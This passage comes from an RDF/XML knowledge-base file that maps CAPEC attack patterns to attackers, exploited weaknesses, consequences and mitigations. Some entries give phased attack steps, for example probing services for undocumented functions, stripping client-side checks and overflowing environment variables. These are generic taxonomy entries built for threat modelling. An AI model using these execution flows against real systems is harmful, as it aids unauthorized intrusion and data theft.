    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker161">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#36">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:113::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Unpublished APIs"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack161">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#36"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::306::693::695::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify services) Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.TECHNIQUE:Search via internet for known  published services.:TECHNIQUE:Use automated tools to scan known ports to identify internet-enabled services.::STEP:2:PHASE:Explore:DESCRIPTION:(Authenticate to service) Authenticate to the service  if required  in order to explore it.TECHNIQUE:Use published credentials to access system.:TECHNIQUE:Find unpublished credentails to access service.:TECHNIQUE:Use other attack pattern or weakness to bypass authentication.::STEP:3:PHASE:Explore:DESCRIPTION:(Identify all interfaces) Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.TECHNIQUE:For any published services  determine exposed interfaces via the documentation provided.:TECHNIQUE:For any services found  use error messages from poorly formed service calls to determine valid interfaces. In some cases  services will respond to poorly formed calls with valid ones.::STEP:4:PHASE:Experiment:DESCRIPTION:(Attempt to discover unpublished functions) Using manual or automated means  discover unpublished or undocumented functions exposed by the service.TECHNIQUE:Manually attempt calls to the service using an educated guess approach  including the use of terms like&apos; &apos;test&apos;  &apos;debug&apos;  &apos;delete&apos;  etc.:TECHNIQUE:Use automated tools to scan the service to attempt to reverse engineer exposed  but undocumented  features.::STEP:5:PHASE:Exploit:DESCRIPTION:(Exploit unpublished functions) Using information determined via experimentation  exploit the unpublished features of the service.TECHNIQUE:Execute features that are not intended to be used by general system users.:TECHNIQUE:Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::306::693::695::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The architecture under attack must publish or otherwise make available services that clients can attach to  either in an unauthenticated fashion  or having obtained an authentication token elsewhere. The service need not be &apos;discoverable&apos;  but in the event it isn&apos;t it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately  the likelihood of exploit depends on discoverability of the vulnerable service.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed  the attacker does not need to know much more in addition to the format of web service messages that he can sniff/monitor for.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Avoid dependence on DNS::Design: Include hosts file/IP address in the application::Implementation: Utilize a .onion domain with Tor support::Implementation: DNSSEC::Implementation: DNS-hold-open::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack162"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not allow override of global variables and do Not Trust Global Variables. If the register_globals option is enabled  PHP will create global variables for each GET  POST  and cookie variable included in the HTTP request. This means that a malicious user may be able to set variables unexpectedly. For instance make sure that the server setting for PHP does not expose global variables.::A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary.::Separate the presentation layer and the business logic layer. Variables at the business logic layer should not be exposed at the presentation layer. This is to prevent computation of business logic from user controlled input data.::Use encapsulation when declaring your variables. This is to lower the exposure of your variables.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should be rejected by the program.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack475"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker53">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#198">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XSS Targeting Error Pages"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack53">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#198"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::81::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::81::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A third party web server which fails to adequately sanitize messages sent in error pages.::The victim must be made to execute a query crafted by the attacker which results in the infected error report.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker295">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#386"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack295"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker319">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#207">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:22::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Removing Important Client Functionality"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack319">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#207"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::602::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Probing) The attacker probes  through brute-forcing  reverse-engineering or other similar means  the functionality on the client that server assumes to be present and trustworthy.TECHNIQUE:The attacker probes by exploring an application&apos;s functionality and its underlying mapping to server-side components.:TECHNIQUE:The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine which functionality to disable or remove) The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.TECHNIQUE:The attacker reverse engineers the client-side code to determine which functionality to disable or remove.::STEP:3:PHASE:Exploit:DESCRIPTION:(Disable or remove the critical functionality from the client code) Once the functionality has been determined  the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.TECHNIQUE:The attacker disables or removes the functionality from the client-side code to perform malicious actions  such as sending of dangerous content (such as scripts) to the server.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::602::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted server must assume the client performs important actions to protect the server or the server functionality. For example  the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover  the server must fail to detect when these assumptions are violated by a client.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on.:LEVEL:High::SKILL:The attacker installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have access to a client and be able to modify the client behavior  often through reverse engineering. If the server is assuming specific client functionality  this usually means the server only recognizes a specific client application  rather than a broad class of client applications. Reverse engineering tools would likely be necessary.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker20">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#502">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:148::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Intent Spoof"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack20">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#502"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not expose environment variable to the user.::Do not use untrusted data in your environment variables.::Use a language or compiler that performs automatic bounds checking::There are tools such as Sharefuzz (R.10.3) which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack457">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#10">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Overflow via Environment Variables"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::302::118::119::74::99::20::680::733::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker tries to find an environment variable which can be overwritten for instance by gathering information about the target host (error pages  software&apos;s version number  etc.).::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker manipulates the environment variable to contain excessive-length content to cause a buffer overflow.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker potentially leverages the buffer overflow to inject maliciously crafted code in an attempt to execute privileged command on the target environment.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack149">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#117">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Interception"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::319::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implement intelligent password throttling mechanisms such as those which take IP address into account  in addition to the login name.::When implementing security features  consider how they can be misused and made to turn on themselves.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack287"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.::UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack72"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker318">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#200"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack318"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must utilize some sort of filtering mechanism (input  output  or data masking).::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To limit one&apos;s exposure to this type of attack  developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component  exposing it to public access. Critical  state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests  the developer should consider dividing that component into separate components. If a component must be exported (e.g.  to receive system broadcasts)  then the component should dynamically check the caller&apos;s identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component&apos;s exposure to a set of trusted applications. Finally  the return values of exported components can also leak private data  so developers should check the caller&apos;s identity prior to returning sensitive values.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack20"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Have a large pool of backup IPs built into the application and support proxy capability in the application.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack153"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker317">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#530"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack317"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge about the target system and sub-components.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop and manufacture malicious system components that resemble legitimate name-brand components.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker22">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#510">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:21::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#SaaS User Request Forgery"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack22">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#510"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::346::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::346::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must be able install a purpose built malicious application onto the trusted user&apos;s system and convince the user to execute it while authenticated to the SaaS application.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack pattern often requires the technical ability to modify a malicious software package (e.g. Zeus) to spider a targeted site and a way to trick a user into a malicious software download.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker316">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#132"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack316"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::59::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The attacker must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To create symlinks:LEVEL:Low::SKILL:To identify the files and create the symlinks during the file operation time window:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker449">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#66"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack449"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::89::74::20::697::713::707::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::SQL queries used by the application to store  retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:It is fairly simple for someone with basic SQL knowledge to perform SQL injection  in general. In certain instances  however  specific knowledge of the database employed may be required.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  explicit intents should be used whenever sensitive data is being sent. An &apos;explicit intent&apos; is delivered to a specific application as declared within the intent  whereas an &apos;implicit intent&apos; is directed to an application as defined by the Android operating system. If an implicit intent must be used  then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e.  with appropriate security controls).::Never use implicit intents for inter-application communication.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack119">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#501">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:499::NATURE:ChildOf:CAPEC ID:173::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Activity Hijack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::923::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker21">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#504"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack21"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::1021::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption Implementation: Do not leak information back to the user as to any cryptography (e.g.  padding) encountered during decryption.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack123">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#463">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:97::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Padding Oracle Crypto Attack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::209::514::649::347::354::696::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker24">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#116">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Excavation"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack24">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#116"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary requires some way of interacting with the system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool  such as a MITM Proxy or a fuzzer  that is capable of generating and injecting custom inputs to be used in the attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Ensure that only legitimate HTTP verbs are allowed.::Design: Do not use HTTP verbs as factors in access decisions.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack308">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#274">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Verb Tampering"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::302::654::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that proper  physical system access is regulated to prevent an adversary from physically connecting a malicious USB device himself.::Use anti-virus and anti-malware tools which can prevent malware from executing if it finds its way onto a target system. Additionally  make sure these tools are regularly updated to contain up-to-date virus and malware signatures.::Do not connect untrusted USB devices to systems connected on an organizational network. Additionally  use an isolated testing machine to validate untrusted devices and confirm malware does not exist.::">
    <j.0:reduces>
